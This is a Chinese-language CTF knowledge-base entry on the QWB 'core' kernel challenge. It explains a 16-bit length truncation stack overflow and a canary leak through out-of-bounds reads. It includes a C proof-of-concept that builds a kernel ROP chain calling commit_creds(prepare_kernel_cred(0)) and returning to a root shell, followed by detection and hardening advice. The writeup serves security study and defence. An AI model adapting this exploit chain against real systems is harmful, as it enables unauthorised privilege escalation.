---
id: binary-pwn-kernel-qwb-core-stack-overflow-rop
title: QWB core 内核栈溢出：core_copy_func 16 位截断 + core_read off 越界泄露 canary + kernel ROP 提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-stack-overflow-16bit-truncation-canary-leak-rop
aliases:
- QWB core
- core.ko
- core_copy_func
- 16 位截断栈溢出
- 内核 canary 泄露
- commit_creds prepare_kernel_cred
- swapgs iretq
- 内核 ROP
tags:
- kernel
- pwn
- stack-overflow
- integer-truncation
- canary-leak
- kernel-rop
- commit-creds
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V180
  verified_at: '2026-11-06T17:24:21+08:00'
  notes: 已对照原文核对：core_write/core_read/core_copy_func 源码、0xf000000000000000+0x300 截断、canary buf[4]、最终 exp 的 swapgs 0xffffffff81a012da/iretq 0xffffffff81050ac2/commit_creds 0x9c8e0/prepare_kernel_cred 0x9cce0 与 mov rdi,rax;call rdx 0xffffffff812d6c84 均一致；未在本机复跑
---

## 一句话结论

内核模块 `core.ko` 的 `core_copy_func` 把 64 位长度参数强制转成 `unsigned short` 用于 `qmemcpy`，用 `0xf000000000000000+0x300` 这类“高位为负、低 16 位为 0x300”的值可绕过 `off > 63` 检查并把 0x300 字节拷进 0x50 栈缓冲区；先用 `core_read` 的可控 `off` 越界读出栈 canary，再把 `commit_creds(prepare_kernel_cred(0))` 的 kernel ROP 链写入全局 `name` 并触发拷贝，最后 `swapgs; iretq` 返回用户态执行 `system("/bin/sh")` 提权。

## 原理

- **写原语**：`core_write` 用 `copy_from_user(&name, user_buf, n)` 把最多 0x800 字节写到全局 `name`；`name` 是后续拷贝的源。
- **读原语/泄露**：`core_read` 把局部 `Welcome_to_the_QWB_CTF_challenge`（64 字节）从 `[off]` 起 64 字节 `copy_to_user` 给用户；`off` 是全局变量，可由 ioctl `0x6677889C` 设置。把 `off` 设为 `0x20`/`0x40` 可越界读取栈上的 canary/返回地址区域；示例 canary 位于读出 buffer 的某个 qword（`buf[4]`，取决于栈帧/索引）。
- **截断溢出**：`core_copy_func(off)` 检查 `if (off > 63) return error;`，否则 `qmemcpy(dst_, &name, (unsigned __int16)off)`。`off` 是 64 位有符号；传 `0xf000000000000000 + 0x300` 时该值为负，`off > 63` 不成立，而低 16 位是 `0x300`，于是从 `name` 拷贝 0x300 字节到只有 0x50 的栈缓冲区，覆盖 canary、保存的 rbp 与返回地址。
- **Kernel ROP**：覆盖返回地址为 gadget 链：
  - `pop rdi; ret` → 0（prepare_kernel_cred 参数）
  - `prepare_kernel_cred`
  - `mov rdi, rax; call rdx;`（把返回值搬到 rdi）
  - `pop rdx; ret` / `pop rcx; ret` 调整调用约定/栈
  - `commit_creds`
  - `swapgs; ...; iretq` 返回用户态
  - iretq 帧：`get_shell`、`user_cs`、`user_rflags`、`user_sp`、`user_ss`
- **符号获取**：示例环境 `/tmp/kallsyms` 可读，直接解析 `commit_creds`/`prepare_kernel_cred`；若 KASLR 开启且 kallsyms 不可读，可先泄露一个内核指针再按固定偏移计算。
- **保护适配**：SMEP 开启时不能直接 `ret2usr` 到用户函数，需全部用内核 gadget/内核函数；SMAP 影响用户内存访问；KPTI 开启时返回用户态要用 `swapgs_restore_regs_and_return_to_usermode` 或 KPTI trampoline 而非裸 `swapgs; iretq`。
- **为什么可行**：长度检查与拷贝使用不同类型（64 位比较、16 位长度），类型转换造成检查/使用不一致；栈 canary 可通过同一模块的越界读泄露；内核 ROP 可调用 `commit_creds` 完成提权。

## 触发条件

- 目标加载了存在 `core_copy_func` 16 位截断的内核模块（QWB core 例题），普通用户可打开 `/proc/core` 并调用 ioctl。
- 模块的 `core_read` 允许可控 `off` 越界读，能泄露栈 canary（或可通过其他方式泄露）。
- 内核版本/符号偏移已知，或 `/tmp/kallsyms`/其他信息泄露可用；KASLR/SMEP/SMAP/KPTI 状态可判断。
- 用户能向全局 `name` 写入 ROP 链，并触发 `core_copy_func` 的栈溢出。
- 有可用的内核 gadget（pop rdi、pop rdx/rcx、mov rdi,rax; call rdx、swapgs、iretq 或 KPTI trampoline）。

## 利用步骤

1. 打开 `/proc/core`；用 ioctl `0x6677889C` 设置全局 `off`（如 0x20/0x40），再用 `0x6677889B` 触发 `core_read`，从返回 buffer 中找出 canary 的位置（示例 `buf[4]`）。
2. 用 `core_write` 把 ROP 链写入全局 `name`：`[canary][0][payload][swapgs][0][iretq][get_shell][user_cs][user_rflags][user_sp][user_ss]`。
3. 设置 `off = 0xf000000000000000 + 0x300`（低 16 位为拷贝长度，高位使 `off > 63` 为假）。
4. 调用 ioctl `0x6677889A` 触发 `core_copy_func`，`qmemcpy` 溢出栈并劫持返回地址。
5. ROP 执行 `commit_creds(prepare_kernel_cred(0))`，`swapgs; iretq` 回到用户态 `get_shell()`，执行 `system("/bin/sh")`。
6. 若 KASLR 开启，先用 `/tmp/kallsyms` 或泄露的指针计算 `commit_creds`/`prepare_kernel_cred`/gadget 地址；若 KPTI 开启，改用 KPTI 返回 trampoline。

## PoC

关键 C 代码（摘自原文最终 exp，省略模板）：

```c
void core_read(int fd, char *buf){ ioctl(fd, 0x6677889B, buf); }
void core_off(int fd, int off){ ioctl(fd, 0x6677889C, off); }
void core_copy(int fd, u64 len){ ioctl(fd, 0x6677889A, len); }

void get_shell(){ system("/bin/sh"); }

int main(){
    save();                       // 保存 user_cs/user_ss/user_rflags/user_sp
    int fd = open("/proc/core", O_RDWR);
    core_off(fd, 0x20);           // 设置读取偏移
    unsigned long long buf[0x100] = {0};
    core_read(fd, (char*)buf);    // 越界读栈

    unsigned long long canary = buf[4];   // 示例 canary 位置，需按栈帧确认

    core_off(fd, 0xf000000000000000 + 0x300);

    unsigned long rop[0x30]; int i = 10;
    u64 swapgs = 0xffffffff81a012da;
    u64 iretq  = 0xffffffff81050ac2;
    u64 prepare_kernel_cred = 0xffffffff81000000 + 0x9cce0;
    u64 commit_creds        = 0xffffffff81000000 + 0x9c8e0;

    rop[8] = canary;
    rop[i++] = 0xffffffff8100036f;                 // nop; xor eax,eax; ret
    rop[i++] = 0xffffffff81000b2f; rop[i++] = 0;   // pop rdi; 0
    rop[i++] = 0xffffffff81000b2f; rop[i++] = 0;   // pop rdi; 0
    rop[i++] = prepare_kernel_cred;
    rop[i++] = 0xffffffff810a0f49;                 // pop rdx; ret
    rop[i++] = 0xffffffff81021e53;                 // pop rcx; ret
    rop[i++] = 0xffffffff812d6c84;                 // mov rdi, rax; call rdx;
    rop[i++] = commit_creds;
    rop[i++] = swapgs;
    rop[i++] = 0;
    rop[i++] = iretq;
    rop[i++] = get_shell;
    rop[i++] = user_cs; rop[i++] = user_rflags;
    rop[i++] = user_sp; rop[i++] = user_ss;

    write(fd, rop, 0x30 * 8);
    core_copy(fd, 0xf000000000000000 + 0x30 * 8);
}
```

原文最终在 QWB core 环境调通并拿到 root shell；PoC 未在本机复跑。

## 变体与关联

- 泄露变体：`core_read` 的 `off` 可正可负，可读 canary/返回地址/内核指针；也可用 printk/dmesg 泄露 KASLR。
- 截断变体：`(unsigned short)off`、`(int)len`、`size_t` 与 `int` 混用；高位为负绕过 `>` 检查是常见模式。
- ROP 变体：SMEP 用内核 gadget；KPTI 用 `swapgs_restore_regs_and_return_to_usermode`/KPTI trampoline；也可 `commit_creds(init_cred)`。
- 关联：[[binary-pwn-kernel-ret2dir-physmap-spray-rop-commit-creds]]（内核 ROP/栈迁移）、[[binary-pwn-kernel-stack-overflow-struct-function-pointer-run-cmd]]（内核栈溢出覆盖函数指针）、[[binary-pwn-kernel-kqueue-maxentries-intwrap-seqops-ret2usr]]（整数截断 + ret2usr）。
- 边界：模块修复长度检查、开启 stack protector/CFI、KASLR 且无泄露、KPTI/SMEP/SMAP 组合未适配时，利用失败。

## 检测与防御

- 检测：内核模块 `copy_from_user`/`qmemcpy` 长度检查与拷贝类型不一致；ioctl 出现超大/负数长度；`/proc/kallsyms` 可读；内核栈 canary 被越界读。
- 修复：长度参数统一用 `size_t`，检查 `off > sizeof(dst)` 后再拷贝；`copy_from_user` 前做边界校验；开启 stack protector、SMEP/SMAP/KPTI、KASLR。
- 加固：限制 `/proc/kallsyms` 与 dmesg 权限；模块开启 CFI/静态分析；监控异常 ioctl 长度与内核栈溢出崩溃。
